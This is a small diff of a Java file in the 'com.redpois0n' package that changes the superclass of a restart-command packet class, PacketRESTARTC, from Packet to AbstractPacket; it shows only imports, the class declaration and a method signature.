@@ -4,7 +4,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.common.os.OperatingSystem;
 import com.redpois0n.utils.Utils;
 
-public class PacketRESTARTC extends Packet {
+public class PacketRESTARTC extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
